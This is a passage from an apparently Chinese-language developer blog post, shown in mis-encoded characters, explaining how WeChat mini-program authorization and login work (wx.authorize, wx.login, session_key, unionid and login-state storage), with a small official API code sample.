        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>å¾®ä¿¡å°ç¨‹åºç›¸æ¯”äºæ™®é€šçš„åº”ç”¨ï¼Œå¾ˆå¤§çš„ä¸€ä¸ªä¼˜åŠ¿åœ¨äºä¸éœ€è¦è¿›è¡Œæ³¨å†Œå’Œæ˜¾å¼ç™»å½•ï¼Œå¤§éƒ¨åˆ†é—®é¢˜å¯ä»¥ç›´æ¥ä¸€é”®å¾®ä¿¡ç™»å½•è§£å†³ã€‚<br>ä½†æ˜¯ï¼Œåœ¨ç‚¹å‡» â€œæˆæƒâ€ã€â€ç™»å½•â€ çš„è¿‡ç¨‹ä¸­ï¼Œéƒ½åšäº†é‚£äº›äº‹æƒ…å‘¢ï¼Ÿ</p><p>1ã€<strong>è·å–ç”¨æˆ·ç™»å½•å‡­è¯</strong>ï¼šå°ç¨‹åºé¦–å…ˆä¼šè°ƒç”¨å¾®ä¿¡æä¾›çš„<code>wx.login</code>æ¥å£ï¼Œè·å–ç”¨æˆ·çš„ç™»å½•å‡­è¯ï¼ˆcodeï¼‰ã€‚è¿™ä¸ªcodeæ˜¯ä¸€ä¸ªä¸´æ—¶çš„ã€æœ‰æ—¶æ•ˆæ€§çš„å­—ç¬¦ä¸²ï¼Œç”¨äºåç»­çš„èº«ä»½éªŒè¯ã€‚</p><p>2ã€<strong>å‘é€è¯·æ±‚åˆ°å¼€å‘è€…æœåŠ¡å™¨</strong>ï¼šå°ç¨‹åºå°†è·å–åˆ°çš„codeå‘é€åˆ°å¼€å‘è€…è‡ªå·±çš„æœåŠ¡å™¨ã€‚è¿™ä¸€æ­¥æ˜¯ä¸ºäº†ä¿æŠ¤ç”¨æˆ·çš„éšç§å’Œå®‰å…¨ï¼Œå› ä¸ºç”¨æˆ·çš„å¾®ä¿¡æ•æ„Ÿä¿¡æ¯ï¼ˆå¦‚openidã€session_keyç­‰ï¼‰ä¸ä¼šç›´æ¥æš´éœ²ç»™å°ç¨‹åºã€‚</p><p>3ã€<strong>å¼€å‘è€…æœåŠ¡å™¨ä¸å¾®ä¿¡æœåŠ¡å™¨äº¤äº’</strong>ï¼šå¼€å‘è€…æœåŠ¡å™¨å°†codeã€å°ç¨‹åºçš„AppIDå’ŒAppSecretï¼ˆè¿™æ˜¯å¼€å‘è€…åœ¨å¾®ä¿¡å…¬ä¼—å¹³å°æ³¨å†Œå°ç¨‹åºæ—¶è·å¾—çš„ï¼Œç”¨äºè¯æ˜å¼€å‘è€…èº«ä»½çš„å¯†é’¥ï¼‰ä¸€èµ·å‘é€ç»™å¾®ä¿¡æœåŠ¡å™¨è¿›è¡Œæ ¡éªŒã€‚</p><p>4ã€<strong>å¾®ä¿¡æœåŠ¡å™¨è¿”å›ç”¨æˆ·ä¿¡æ¯</strong>ï¼šå¦‚æœæ ¡éªŒé€šè¿‡ï¼Œå¾®ä¿¡æœåŠ¡å™¨ä¼šè¿”å›ä¸€ä¸ªopenidå’Œä¸€ä¸ªsession_keyç»™å¼€å‘è€…æœåŠ¡å™¨ã€‚openidæ˜¯ç”¨æˆ·åœ¨å¾®ä¿¡ä¸­çš„å”¯ä¸€æ ‡è¯†ï¼Œsession_keyæ˜¯æœ¬æ¬¡ä¼šè¯çš„å¯†é’¥ï¼Œç”¨äºåç»­åŠ å¯†ç”¨æˆ·æ•°æ®çš„è§£å¯†ã€‚</p><p>5ã€<strong>å¼€å‘è€…æœåŠ¡å™¨è¿”å›ç”¨æˆ·ä¿¡æ¯ç»™å°ç¨‹åº</strong>ï¼šå¼€å‘è€…æœåŠ¡å™¨å¯ä»¥å°†openidè¿”å›ç»™å°ç¨‹åºã€‚å°ç¨‹åºå¯ä»¥æ ¹æ®openidè¿›è¡Œç”¨æˆ·çš„å”¯ä¸€æ ‡è¯†å’Œä¸šåŠ¡å¤„ç†ã€‚å¦‚æœéœ€è¦è·å–æ›´å¤šç”¨æˆ·ä¿¡æ¯ï¼Œå¦‚æ˜µç§°ã€å¤´åƒç­‰ï¼Œå°ç¨‹åºè¿˜éœ€è¦ç”¨æˆ·è¿›è¡Œé¢å¤–çš„æˆæƒæ“ä½œã€‚</p><p>6ã€<strong>ç”¨æˆ·æˆæƒæ“ä½œ</strong>ï¼šå¦‚æœç”¨æˆ·éœ€è¦æˆæƒå°ç¨‹åºè·å–æ›´å¤šçš„ä¸ªäººä¿¡æ¯ï¼Œå°ç¨‹åºä¼šå±•ç¤ºä¸€ä¸ªæˆæƒç•Œé¢ï¼Œç”¨æˆ·ç‚¹å‡»â€œæˆæƒâ€æŒ‰é’®åï¼Œå°ç¨‹åºå°±å¯ä»¥è·å–åˆ°ç”¨æˆ·çš„åŸºæœ¬ä¿¡æ¯äº†ã€‚</p><p>è¿™äº›å°±æ˜¯åœ¨å¾®ä¿¡å°ç¨‹åºä¸­ç‚¹å‡»â€œæˆæƒâ€æˆ–â€œç™»å½•â€çš„è¿‡ç¨‹ä¸­ï¼Œä¸»è¦å‘ç”Ÿçš„ä¸€ç³»åˆ—æ“ä½œã€‚è¿™æ ·çš„è®¾è®¡æ—¢ä¿è¯äº†ç”¨æˆ·ä¿¡æ¯çš„å®‰å…¨æ€§ï¼Œåˆç®€åŒ–äº†ç”¨æˆ·çš„ç™»å½•æµç¨‹ï¼Œæé«˜äº†ç”¨æˆ·ä½“éªŒã€‚</p><p>ä¸‹é¢é€šè¿‡å››ä¸ªæ–¹é¢ä¸»è¦è¯´ä¸€ä¸‹å…·ä½“çš„ç»†èŠ‚ï¼š</p><ul><li>æˆæƒå’Œç™»å½•çš„æ„ä¹‰</li><li>sessionkeyçš„ä½œç”¨</li><li>unionidçš„ä½œç”¨ï¼Œæœ‰å“ªäº›è·å–é€”å¾„</li><li>åœ¨åº”ç”¨ä¸­å¦‚ä½•ä¿å­˜ç”¨æˆ·ç™»å½•æ€</li></ul><h1 id="æˆæƒå’Œç™»å½•çš„æ„ä¹‰"><a href="#æˆæƒå’Œç™»å½•çš„æ„ä¹‰" class="headerlink" title="æˆæƒå’Œç™»å½•çš„æ„ä¹‰"></a>æˆæƒå’Œç™»å½•çš„æ„ä¹‰</h1><p>é¦–å…ˆï¼Œåœ¨è¿™å—éœ€è¦æ˜ç¡®ä¸€ä¸‹æ¦‚å¿µï¼Œ<strong>æˆæƒ</strong> å’Œ <strong>ç™»å½•</strong> æ˜¯ä¸¤ä¸ªæ“ä½œã€‚</p><h2 id="1-æˆæƒ"><a href="#1-æˆæƒ" class="headerlink" title="1. æˆæƒ"></a>1. æˆæƒ</h2><p>éƒ¨åˆ†æ¥å£éœ€è¦ç»è¿‡ç”¨æˆ·æˆæƒåŒæ„æ‰èƒ½è°ƒç”¨ã€‚æŠŠè¿™äº›æ¥å£æŒ‰ä½¿ç”¨èŒƒå›´åˆ†æˆå¤šä¸ª <code>scope</code> ï¼Œç”¨æˆ·é€‰æ‹©å¯¹ <code>scope</code> æ¥è¿›è¡Œæˆæƒï¼Œå½“æˆæƒç»™ä¸€ä¸ª <code>scope</code> ä¹‹åï¼Œå…¶å¯¹åº”çš„æ‰€æœ‰æ¥å£éƒ½å¯ä»¥ç›´æ¥ä½¿ç”¨ã€‚</p><p>æ­¤ç±»æ¥å£è°ƒç”¨æ—¶ï¼š</p><ul><li>å¦‚æœç”¨æˆ·æœªæ¥å—æˆ–æ‹’ç»è¿‡æ­¤æƒé™ï¼Œä¼šå¼¹çª—è¯¢é—®ç”¨æˆ·ï¼Œç”¨æˆ·ç‚¹å‡»åŒæ„åæ–¹å¯è°ƒç”¨æ¥å£ï¼›</li><li>å¦‚æœç”¨æˆ·å·²æˆæƒï¼Œå¯ä»¥ç›´æ¥è°ƒç”¨æ¥å£ï¼›</li><li>å¦‚æœç”¨æˆ·å·²æ‹’ç»æˆæƒï¼Œåˆ™ä¸ä¼šå‡ºç°å¼¹çª—ï¼Œè€Œæ˜¯ç›´æ¥è¿›å…¥æ¥å£ fail å›è°ƒã€‚</li></ul><p>å‚è€ƒå°ç¨‹åºå¼€å‘æ–‡æ¡£<a href="https://developers.weixin.qq.com/miniprogram/dev/framework/open-ability/authorize.html">å¼€æ”¾èƒ½åŠ› &#x2F; ç”¨æˆ·ä¿¡æ¯ &#x2F; æˆæƒ (qq.com)</a>ä¸­ï¼Œæˆæƒæ“ä½œæ˜¯é€šè¿‡**wx.authorize()**æ¥å£ä¾¿å¯ä»¥å®Œæˆ</p><p>æå‰å‘ç”¨æˆ·å‘èµ·æˆæƒè¯·æ±‚ã€‚è°ƒç”¨åä¼šç«‹åˆ»å¼¹çª—è¯¢é—®ç”¨æˆ·æ˜¯å¦åŒæ„æˆæƒå°ç¨‹åºä½¿ç”¨æŸé¡¹åŠŸèƒ½æˆ–è·å–ç”¨æˆ·çš„æŸäº›æ•°æ®ï¼Œä½†ä¸ä¼šå®é™…è°ƒç”¨å¯¹åº”æ¥å£ã€‚å¦‚æœç”¨æˆ·ä¹‹å‰å·²ç»åŒæ„æˆæƒï¼Œåˆ™ä¸ä¼šå‡ºç°å¼¹çª—ï¼Œç›´æ¥è¿”å›æˆåŠŸã€‚</p><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆæƒè¿‡ç¨‹å®é™…ä¸Šåªæ˜¯åœ¨å°ç¨‹åºå‰ç«¯è·å¾—äº†æ“ä½œéƒ¨åˆ†wx æ¥å£çš„è®¿é—®è®¸å¯ï¼Œè¿™ä¸ªè¿‡ç¨‹å®é™…ä¸Šæ˜¯ä¸ä¼šä¸<strong>å¼€å‘è€…æœåŠ¡å™¨</strong>å‘ç”Ÿä»»ä½•å…³ç³»çš„ã€‚</p><p>å†æ¥çœ‹å¾®ä¿¡å®˜æ–¹æä¾›çš„scope åˆ—è¡¨ï¼š</p><p> <img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405051925365.png" alt="image-20240505192518306"> </p><p>wx.authorize(Object object)æ¥å£ç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// å¯ä»¥é€šè¿‡ wx.getSetting å…ˆæŸ¥è¯¢ä¸€ä¸‹ç”¨æˆ·æ˜¯å¦æˆæƒäº† &quot;scope.record&quot; è¿™ä¸ª scope</span></span><br><span class="line">wx.<span class="title function_">getSetting</span>(&#123;</span><br><span class="line">  <span class="title function_">success</span>(<span class="params">res</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!res.<span class="property">authSetting</span>[<span class="string">&#x27;scope.record&#x27;</span>]) &#123;</span><br><span class="line">      wx.<span class="title function_">authorize</span>(&#123;</span><br><span class="line">        <span class="attr">scope</span>: <span class="string">&#x27;scope.record&#x27;</span>,</span><br><span class="line">        success () &#123;</span><br><span class="line">          <span class="comment">// ç”¨æˆ·å·²ç»åŒæ„å°ç¨‹åºä½¿ç”¨å½•éŸ³åŠŸèƒ½ï¼Œåç»­è°ƒç”¨ wx.startRecord æ¥å£ä¸ä¼šå¼¹çª—è¯¢é—®</span></span><br><span class="line">          wx.<span class="title function_">startRecord</span>()</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="2-ç™»å½•"><a href="#2-ç™»å½•" class="headerlink" title="2. ç™»å½•"></a>2. ç™»å½•</h2><p>æ‰€è°“çš„ç™»å½•å°±æ˜¯è¦è®©<strong>å¼€å‘è€…æœåŠ¡å™¨</strong>çŸ¥é“å½“å‰çš„ç”¨æˆ·æ˜¯è°ï¼Ÿåœ¨ä¼ ç»Ÿçš„web åº”ç”¨ä¸­ï¼Œæˆ‘ä»¬å¿…é¡»è¦è®©ç”¨æˆ·è¾“å…¥è´¦å·å’Œå¯†ç æ‰èƒ½å®ç°ç™»å½•æ“ä½œã€‚ä½†æ˜¯åœ¨å¾®ä¿¡åº”ç”¨ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å¾®ä¿¡æœåŠ¡å™¨æ¥å®Œæˆè¿™ä¸ªæ“ä½œï¼Œè·å–åˆ°ä¸å½“å‰ç”¨æˆ·å¯¹åº”çš„å”¯ä¸€æ ‡å¿—ï¼ˆ**<u>openId</u>**ï¼‰ã€‚</p><p>å¾®ä¿¡æä¾›äº†ä¸¤ç§æ–¹æ³•  <strong>wx.login å’Œ  wx.getUserProfile</strong> ï¼Œ<strong>å®˜æ–¹æ˜¯æ¨èä½¿ç”¨ç¬¬äºŒç§å› ä¸ºç¬¬äºŒç§æ˜¯å¿…é¡»è¦é€šè¿‡ç”¨æˆ·çš„æˆæƒæ‰å¯ä»¥è·å–ä¿¡æ¯ï¼Œè€Œç¬¬ä¸€ç§åˆ™æ˜¯ç›´æ¥è·å–ã€‚</strong></p><h3 id="wx-loginï¼š"><a href="#wx-loginï¼š" class="headerlink" title="wx.loginï¼š"></a>wx.loginï¼š</h3><p>wx.login()ç”¨æ¥åšç™»å½•çš„æ–¹æ³•ï¼Œè°ƒç”¨æ¥å£è·å–ç™»å½•å‡­è¯ï¼Œcodeå‘é€ç»™åç«¯ç”¨äºç½®æ¢session_keyå’Œopenidç­‰æ•°æ®ã€‚æ¯ä¸ªç”¨æˆ·ç›¸å¯¹äºæ¯ä¸ªå¾®ä¿¡åº”ç”¨ï¼ˆå…¬ä¼—å·æˆ–è€…å°ç¨‹åºï¼‰çš„openId æ˜¯å”¯ä¸€çš„ï¼Œä¹Ÿå°±æ˜¯è¯´ä¸€ä¸ªç”¨æˆ·ç›¸å¯¹äºä¸åŒçš„å¾®ä¿¡åº”ç”¨ä¼šå­˜åœ¨ä¸åŒçš„openIdã€‚</p><p>å°ç¨‹åºå¯ä»¥é€šè¿‡å¾®ä¿¡å®˜æ–¹æä¾›çš„ç™»å½•èƒ½åŠ›æ–¹ä¾¿åœ°è·å–å¾®ä¿¡æä¾›çš„ç”¨æˆ·èº«ä»½æ ‡è¯†ï¼Œå¿«é€Ÿå»ºç«‹å°ç¨‹åºå†…çš„ç”¨æˆ·ä½“ç³»ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405051925825.png" alt="image-20240505192537783">  </p><p><strong>ä¸Šå›¾æ˜¯å°ç¨‹åºå®˜æ–¹çš„ä¸€å¼ ç™»å½•æµç¨‹å›¾ï¼Œå¯ä»¥ç®€å•è¯´ä¸€ä¸‹è¿™ä¸ªæµç¨‹</strong></p><p>1ã€è°ƒç”¨ <a href="https://developers.weixin.qq.com/miniprogram/dev/api/open-api/login/wx.login.html">wx.login()</a> è·å– <strong>ä¸´æ—¶ç™»å½•å‡­è¯code</strong> ï¼Œå¹¶å›ä¼ åˆ°å¼€å‘è€…æœåŠ¡å™¨ã€‚</p><p>2ã€åç«¯è°ƒç”¨å¾®ä¿¡æ¥å£ï¼Œç”¨appid+appsecret+codeå‘é€è¿‡å»ï¼Œç½®æ¢åˆ°session_key+openidï¼Œä»¥å‰æ˜¯ä¸èƒ½ç½®æ¢unionidçš„ï¼Œä½†æ˜¯ç°åœ¨åœ¨æ»¡è¶³ä»¥ä¸‹æ¡ä»¶å¯ä»¥ç½®æ¢åˆ°unionid</p><ul><li>å¾®ä¿¡å¼€æ”¾å¹³å°ä¸‹å­˜åœ¨åŒä¸»ä½“çš„Appã€å…¬ä¼—å·ã€å°ç¨‹åº </li><li>ç”¨æˆ·å…³æ³¨äº†æŸä¸ªç›¸åŒä¸»ä½“å…¬ä¼—å·ï¼Œæˆ–æ›¾ç»åœ¨æŸä¸ªç›¸åŒä¸»ä½“Appã€å…¬ä¼—å·ä¸Šè¿›è¡Œè¿‡å¾®ä¿¡ç™»å½•æˆæƒ åŒæ—¶æ»¡è¶³ä»¥ä¸Šä¸¤ä¸ªæ¡ä»¶å°±èƒ½æ‹¿åˆ°ç”¨æˆ·unionidï¼Œè¿™æ ·ä¸€æ¥ï¼Œå°±èƒ½åœ¨wx.login()å‡†ç¡®è¯†åˆ«å‡ºç”¨æˆ·æ˜¯è°</li></ul><p>3ã€è‡ªå®šä¹‰ç™»å½•æ€ä¸openidå’Œsession_keyå…³è”ï¼Œå®é™…å°±æ˜¯ç”Ÿæˆä¸€ä¸ªä¸openidï¼Œsession_keyå…³è”çš„tokenï¼Œä¸‹å‘ç»™å‰ç«¯</p><p>4ã€å‰ç«¯å°†åç«¯ä¸‹å‘çš„tokenå­˜å…¥ç¼“å­˜ï¼Œåœ¨åé¢çš„æ¥å£è¯·æ±‚ä¸­å¸¦ä¸Šè‡ªå®šç™»å½•æ€</p><p>ä»¥ä¸Šå°±æ˜¯å°ç¨‹åºçš„æ•´ä¸ªç™»å½•æµç¨‹ï¼Œå¯ä»¥çœ‹åˆ°åœ¨ç‰¹å®šçš„æ¡ä»¶ä¸‹ï¼Œé€šè¿‡wx.login()çš„è°ƒç”¨æ‹¿åˆ°unionIdä¹Ÿèƒ½åœ¨åç«¯æ•°æ®åº“é‡Œæ‹¿åˆ°ç”¨æˆ·ä¿¡æ¯ã€‚</p><h3 id="wx-getUserInfo-wx-getUserProfile-ï¼š"><a href="#wx-getUserInfo-wx-getUserProfile-ï¼š" class="headerlink" title="wx.getUserInfo()&#x2F;wx.getUserProfile()ï¼š"></a>wx.getUserInfo()&#x2F;wx.getUserProfile()ï¼š</h3><p>åŠŸèƒ½æè¿°ï¼šè·å–ç”¨æˆ·ä¿¡æ¯ã€‚é¡µé¢äº§ç”Ÿç‚¹å‡»äº‹ä»¶ï¼ˆä¾‹å¦‚ <code>button</code> ä¸Š <code>bindtap</code> çš„å›è°ƒä¸­ï¼‰åæ‰å¯è°ƒç”¨ï¼Œæ¯æ¬¡è¯·æ±‚éƒ½ä¼šå¼¹å‡ºæˆæƒçª—å£ï¼Œç”¨æˆ·åŒæ„åè¿”å› <code>userInfo</code>ã€‚<code>wx.getUserProfile</code>è¯¥æ¥å£ç”¨äºæ›¿æ¢ <code>wx.getUserInfo</code>ï¼Œè¯¦è§ <a href="https://developers.weixin.qq.com/community/develop/doc/000cacfa20ce88df04cb468bc52801?highLine=login">ç”¨æˆ·ä¿¡æ¯æ¥å£è°ƒæ•´è¯´æ˜</a>ã€‚</p><p>è¿™å—ä»¥<code>wx.getUserInfo</code>ä¸ºä¾‹ï¼Œé¦–å…ˆçœ‹ä¸€ä¸‹è¿™ä¸ªAPIï¼š</p><p> <img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405051930698.png" alt="image-20240505193046661"> </p><p>åœ¨è®¾ç½®withCredentials å±æ€§ä¸ºtrue çš„æƒ…å†µä¸‹ï¼Œè¿™ä¸ªapi å¯ä»¥æ‹¿åˆ°encryptedDataï¼Œiv ç­‰æ•æ„Ÿä¿¡æ¯ï¼ŒencryptedData éœ€è¦ä½¿ç”¨session_key è¿›è¡Œè§£å¯†ï¼Œè§£å¯†åå¯ä»¥æ‹¿åˆ°çš„æ•°æ®ã€‚</p><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œsession_keyçš„ä½œç”¨ä¹‹ä¸€æ˜¯å°†å°ç¨‹åºå‰ç«¯ä»å¾®ä¿¡æœåŠ¡å™¨è·å–åˆ°çš„encryptedData è§£å¯†å‡ºæ¥ï¼Œè·å–åˆ°openId å’ŒunionIdç­‰ä¿¡æ¯ã€‚</p><p>ä½†æ˜¯åœ¨wx.login()ç™»å½•è¿‡ç¨‹ä¸­å¯ä»¥çœ‹åˆ°å¼€å‘è€…æœåŠ¡å™¨æ˜¯èƒ½å¤Ÿç›´æ¥æ‹¿åˆ°ç”¨æˆ·çš„openIdä¿¡æ¯ï¼Œè€Œä¸”unionId ä¹Ÿæ˜¯æœ‰å…¶ä»–è·å–é€”å¾„ï¼Œæ‰€ä»¥session_key åœ¨è¿™é‡Œçš„ä½œç”¨çœ‹èµ·æ¥æœ‰ç‚¹é¸¡è‚‹ã€‚</p><p>å…·ä½“session_keyæœ‰ä»€ä¹ˆä½œç”¨ï¼Œå¯ä»¥ç»§ç»­å¾€ä¸‹çœ‹ã€‚</p><h1 id="sessionkeyçš„ä½œç”¨"><a href="#sessionkeyçš„ä½œç”¨" class="headerlink" title="sessionkeyçš„ä½œç”¨"></a>sessionkeyçš„ä½œç”¨</h1><p>ç™»å½•è¿‡ç¨‹ä¸­æ¶‰åŠsession_keyå’ŒunionIdï¼Œäºæ˜¯åˆå¼•å‡ºäº†ä¸‹é¢çš„é—®é¢˜ã€‚</p><p>session_keyåœ¨ç™»å½•çš„è¿‡ç¨‹ä¸­æˆ–è€…ç™»å½•å®Œæˆåèµ·ä»€ä¹ˆä½œç”¨å‘¢ï¼Ÿ</p><p>å‰é¢è¯´åˆ°åœ¨<code>wx.getUserInfo()</code>ä¸­å¯ä»¥åˆ©ç”¨session_key å¯¹encryptedDataè¿›è¡ŒåŠ è§£å¯†ï¼Œé‚£å…·ä½“åœ¨ä»€ä¹ˆåœºæ™¯ä¸‹ä¼šæ¶‰åŠå‘¢ï¼Ÿï¼Ÿï¼Ÿ</p><p>ã€åœºæ™¯ä¸¾ä¾‹ã€‘</p><p>åœ¨ä½¿ç”¨å¾®ä¿¡å°ç¨‹åºçš„æ—¶å€™ï¼Œç™»å½•ä¸€èˆ¬ä¼šæä¾› <strong>å¾®ä¿¡æˆæƒä¸€é”®ç™»å½•</strong>ï¼Œè¿™æ—¶å€™ä¼šå¼¹çª—ï¼Œç¡®è®¤æ‰‹æœºå·ï¼Œç„¶åè¿›è¡Œç™»å½•ç¡®è®¤ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405051937473.png" alt="image.png"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405051939889.png" alt="image-20240505193931858"> </p><p>æ‰€ä»¥ï¼Œsession_key ä¸€ä¸ªé‡è¦çš„ä½œç”¨å¤§æ¦‚ä½“ç°åœ¨è·å–ç”¨æˆ·æ‰‹æœºæ–¹é¢ï¼ˆå¯èƒ½è¿˜åŒ…å«å…¶ä»–æ•æ„Ÿä¿¡æ¯è·å–apiï¼‰ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405051942985.png" alt="image-20240505194236945"> </p><p>å¯ä»¥çœ‹åˆ°getPhoneNumber è¿”å›çš„ç”¨æˆ·æ•°æ®æ˜¯åŠ å¯†è¿‡çš„ï¼Œåªæœ‰ä½¿ç”¨session_keyæ‰èƒ½è§£å¯†ï¼Œè€Œå°ç¨‹åºå‰ç«¯æ²¡æœ‰session_keyï¼Œæ‰€ä»¥æ— æ³•è·å–åˆ°ç”¨æˆ·çš„æ‰‹æœºï¼Œåªèƒ½ä¼ åˆ°å¼€å‘è€…æœåŠ¡å™¨è¿›è¡Œå¤„ç†ã€‚</p><h1 id="unionId-çš„ä½œç”¨-è·å–é€”å¾„"><a href="#unionId-çš„ä½œç”¨-è·å–é€”å¾„" class="headerlink" title="unionId çš„ä½œç”¨&amp;è·å–é€”å¾„"></a>unionId çš„ä½œç”¨&amp;è·å–é€”å¾„</h1><h2 id="1-unionidæœºåˆ¶è¯´æ˜"><a href="#1-unionidæœºåˆ¶è¯´æ˜" class="headerlink" title="1. unionidæœºåˆ¶è¯´æ˜"></a>1. unionidæœºåˆ¶è¯´æ˜</h2><p>å¦‚æœå…¬å¸æ‹¥æœ‰å¤šä¸ªç§»åŠ¨åº”ç”¨ã€ç½‘ç«™åº”ç”¨ã€å’Œå…¬ä¼—å¸å·ï¼ˆåŒ…æ‹¬å°ç¨‹åºï¼‰ï¼Œå¯é€šè¿‡unionidæ¥åŒºåˆ†ç”¨æˆ·çš„å”¯ä¸€æ€§ï¼Œå› ä¸ºåªè¦æ˜¯åŒä¸€ä¸ªå¾®ä¿¡å¼€æ”¾å¹³å°å¸å·ä¸‹çš„ç§»åŠ¨åº”ç”¨ã€ç½‘ç«™åº”ç”¨å’Œå…¬ä¼—å¸å·ï¼ˆåŒ…æ‹¬å°ç¨‹åºï¼‰ï¼Œç”¨æˆ·çš„unionidæ˜¯å”¯ä¸€çš„ã€‚æ¢å¥è¯è¯´ï¼ŒåŒä¸€ç”¨æˆ·ï¼Œå¯¹åŒä¸€ä¸ªå¾®ä¿¡å¼€æ”¾å¹³å°ä¸‹çš„ä¸åŒåº”ç”¨ï¼Œunionidæ˜¯ç›¸åŒçš„ã€‚</p><p><strong>Tip</strong>ï¼šunionid ç”¨äºè¯†åˆ«åŒä¸€ä¸»ä½“ä¸‹ä¸åŒè´¦å·ä¹‹é—´çš„ç”¨æˆ·ã€‚ä¸¾ä¾‹è¯´æ˜ï¼šå°±æ˜¯å…¬å¸æœ‰Aè®¢é˜…å·ï¼ŒBæœåŠ¡å·ï¼ŒåŒä¸€ä¸ªäººå…³æ³¨Aå’ŒBï¼Œä¼šå¾—åˆ°ä¸åŒçš„OPENIDï¼Œä½†æ˜¯ä¼šå¾—åˆ°ç›¸åŒçš„unionidã€‚è¿™æ ·å°±å¯ä»¥è¯†åˆ«åˆ°ç›¸åŒçš„ç”¨æˆ·ï¼Œç”¨äºä¸åŒè´¦å·ä¹‹é—´æ‰“é€šç”¨æˆ·å…³ç³»ã€‚</p><h2 id="2-UnionIDè·å–é€”å¾„"><a href="#2-UnionIDè·å–é€”å¾„" class="headerlink" title="2. UnionIDè·å–é€”å¾„"></a>2. <strong>UnionIDè·å–é€”å¾„</strong></h2><p>å¿…é¡»æœ‰ä¸€ä¸ªå¾®ä¿¡å¼€æ”¾å¹³å°è´¦å·ç»‘å®šäº†è‡³å°‘ä¸€ä¸ªå¾®ä¿¡å…¬ä¼—è´¦å·æˆ–è€…ç½‘ç«™åº”ç”¨æˆ–è€…å°ç¨‹åºï¼Œå¦åˆ™UnionIDè¿”å›nullã€‚ç»‘å®šäº†å¼€å‘è€…å¸å·çš„å°ç¨‹åºï¼Œå¯ä»¥é€šè¿‡ä¸‹é¢3ç§é€”å¾„è·å–UnionIDã€‚</p><p><strong>æ–¹æ³•ä¸€ï¼š</strong>è°ƒç”¨æ¥å£wx.getUserInfoï¼Œä»è§£å¯†æ•°æ®ä¸­è·å–UnionIDã€‚æ³¨æ„æœ¬æ¥å£éœ€è¦ç”¨æˆ·æˆæƒï¼Œè¯·å¼€å‘è€…å¦¥å–„å¤„ç†ç”¨æˆ·æ‹’ç»æˆæƒåçš„æƒ…å†µã€‚</p><p><strong>æ–¹æ³•äºŒï¼š</strong>å¦‚æœå¼€å‘è€…å¸å·ä¸‹å­˜åœ¨åŒä¸»ä½“çš„å…¬ä¼—å·ï¼Œå¹¶ä¸”è¯¥ç”¨æˆ·å·²ç»å…³æ³¨äº†è¯¥å…¬ä¼—å·ã€‚å¼€å‘è€…å¯ä»¥ç›´æ¥é€šè¿‡wx.loginè·å–åˆ°è¯¥ç”¨æˆ·UnionIDï¼Œæ— é¡»ç”¨æˆ·å†æ¬¡æˆæƒã€‚</p><p><strong>æ–¹æ³•ä¸‰ï¼š</strong>å¦‚æœå¼€å‘è€…å¸å·ä¸‹å­˜åœ¨åŒä¸»ä½“çš„å…¬ä¼—å·æˆ–ç§»åŠ¨åº”ç”¨ï¼Œå¹¶ä¸”è¯¥ç”¨æˆ·å·²ç»æˆæƒç™»å½•è¿‡è¯¥å…¬ä¼—å·æˆ–ç§»åŠ¨åº”ç”¨ã€‚å¼€å‘è€…ä¹Ÿå¯ä»¥ç›´æ¥é€šè¿‡wx.loginè·å–åˆ°è¯¥ç”¨æˆ·UnionIDï¼Œæ— é¡»ç”¨æˆ·å†æ¬¡æˆæƒã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405051944734.png" alt="img"> </p><h1 id="åœ¨åº”ç”¨ä¸­å¦‚ä½•ä¿å­˜ç™»å½•æ€"><a href="#åœ¨åº”ç”¨ä¸­å¦‚ä½•ä¿å­˜ç™»å½•æ€" class="headerlink" title="åœ¨åº”ç”¨ä¸­å¦‚ä½•ä¿å­˜ç™»å½•æ€"></a>åœ¨åº”ç”¨ä¸­å¦‚ä½•ä¿å­˜ç™»å½•æ€</h1><p>ä¿å­˜ç”¨æˆ·ç™»å½•æ€ï¼Œä¸€ç›´ä»¥æ¥éƒ½æœ‰ä¸¤ç§è§£å†³æ–¹æ¡ˆï¼šå‰ç«¯ä¿å­˜å’Œåç«¯ä¿å­˜ã€‚</p><h2 id="1-å‰ç«¯ä¿å­˜"><a href="#1-å‰ç«¯ä¿å­˜" class="headerlink" title="1. å‰ç«¯ä¿å­˜"></a>1. å‰ç«¯ä¿å­˜</h2><p>åœ¨å‰é¢ç™»å½•ç« èŠ‚ä¸­<strong>è‡ªå®šä¹‰ç™»å½•æ€</strong>å†™session çš„æ—¶å€™å¯ä»¥ç›´æ¥è®¾å®šè¿‡æœŸæ—¶é—´ï¼Œå®šæœŸé€šçŸ¥å°ç¨‹åºå‰ç«¯é‡æ–°è¿›è¡Œç™»å½•ï¼ˆwx.loginï¼‰ã€‚</p><h2 id="2-å‰ç«¯ä¿å­˜"><a href="#2-å‰ç«¯ä¿å­˜" class="headerlink" title="2. å‰ç«¯ä¿å­˜"></a>2. å‰ç«¯ä¿å­˜</h2><p>å› ä¸ºsession_key å­˜åœ¨æ—¶æ•ˆæ€§é—®é¢˜ï¼ˆæ¯•ç«Ÿæ˜¯ç”¨æ¥æŸ¥çœ‹æ•æ„Ÿä¿¡æ¯ï¼‰ï¼Œè€Œå°ç¨‹åºå‰ç«¯å¯ä»¥é€šè¿‡wx.checkSession() æ¥æ£€æŸ¥session_key 